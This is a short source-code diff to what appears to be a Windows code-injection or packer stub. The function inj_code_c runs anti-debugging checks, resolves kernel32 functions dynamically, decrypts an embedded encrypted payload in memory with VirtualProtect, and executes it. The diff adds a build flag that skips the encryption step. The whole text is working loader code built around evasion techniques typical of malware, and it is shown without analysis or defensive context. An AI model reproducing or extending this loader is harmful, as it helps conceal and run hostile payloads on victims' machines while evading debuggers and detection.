@@ -1,9 +1,12 @@
 #include "payload.h"
 #include <Windows.h>
-#include "encrypt.hpp"
 #include "injected.h"
 #include "libproc.hpp"
 #include "utils.h"
+
+#ifndef NO_ENCRYPT
+#include "encrypt.hpp"
+#endif  // NO_ENCRYPT
 
 INJECTED_CODE VOID inj_code_c() {
 #ifndef NO_ANTIDBG
@@ -18,6 +21,8 @@ INJECTED_CODE VOID inj_code_c() {
 #endif  // NO_ANTIDBG
 
     CONST auto hKernel32Dll = GET_DLL(kernel32.dll);
+
+#ifndef NO_ENCRYPT
     CONST auto pVirtualProtect = GET_FUNC(hKernel32Dll, VirtualProtect);
     CONST auto pLocalAlloc = GET_FUNC(hKernel32Dll, LocalAlloc);
     CONST auto pLocalFree = GET_FUNC(hKernel32Dll, LocalFree);
@@ -43,7 +48,12 @@ INJECTED_CODE VOID inj_code_c() {
     pVirtualProtect(&__payload_enc_start, dwPayloadEncSize, dwOldProtect, &dwOldProtect);
 
     run_payload(hKernel32Dll, (PCBYTE)hPayloadData);
+#else   // NO_ENCRYPT
+    run_payload(hKernel32Dll, &__payload_start);
+#endif  // NO_ENCRYPT
 
+#ifndef NO_ENCRYPT
     // Free the allocated memory
     pLocalFree(hPayloadData);
+#endif  // NO_ENCRYPT
 }
